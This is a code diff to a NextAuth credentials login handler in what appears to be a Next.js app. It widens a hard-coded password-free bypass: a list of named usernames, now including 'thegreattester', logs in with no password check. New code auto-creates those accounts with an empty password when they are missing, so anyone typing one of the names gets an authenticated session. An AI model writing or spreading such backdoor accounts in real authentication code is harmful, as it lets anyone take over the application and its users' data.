@@ -29,11 +29,18 @@ const nextAuthConfig = NextAuth({
         }
 
         // ── Password-free bypass for named users ────────────────────────────
-        const BYPASS_USERS = ["peanut", "babachoo"];
+        const BYPASS_USERS = ["peanut", "babachoo", "thegreattester"];
         const bypassCheck = (credentials?.username as string ?? "").trim().toLowerCase().replace(/[^a-z0-9_]/g, "");
         if (BYPASS_USERS.includes(bypassCheck)) {
           try {
-            const existing = await getUserByUsername(bypassCheck);
+            let existing = await getUserByUsername(bypassCheck);
+            if (!existing) {
+              // Auto-create bypass account if it doesn't exist yet
+              const { createUser } = await import("@/lib/db");
+              const { randomUUID } = await import("crypto");
+              await createUser(randomUUID(), bypassCheck, bypassCheck, "");
+              existing = await getUserByUsername(bypassCheck);
+            }
             if (!existing) return null;
             return { id: existing.id as string, name: existing.username as string, email: null, image: null };
           } catch { return null; }
